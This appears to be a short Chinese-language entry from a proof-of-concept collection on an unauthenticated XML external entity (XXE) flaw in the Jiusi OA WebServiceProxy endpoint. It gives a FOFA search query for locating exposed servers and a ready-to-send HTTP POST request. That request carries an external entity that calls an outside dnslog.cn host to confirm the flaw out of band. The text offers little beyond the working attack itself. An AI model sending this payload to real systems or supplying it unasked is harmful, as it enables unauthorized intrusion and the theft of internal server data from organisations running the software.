# 九思OA接口WebServiceProxy存在XXE漏洞

九思OA接口isoaNebServiceProxy 存在XML实体注入漏洞，未经身份认证的攻击者可利用此漏洞获取服务器内部敏感数据。

## fofa

```yaml
body="/jsoa/login.jsp"
```

## poc

```java
POST /jsoa/WebServiceProxy HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
Accept: */*
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
Content-Type: application/x-www-form-urlencoded
Connection: close
 
<!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://11111.edbxqa.dnslog.cn"> %remote;]>
```

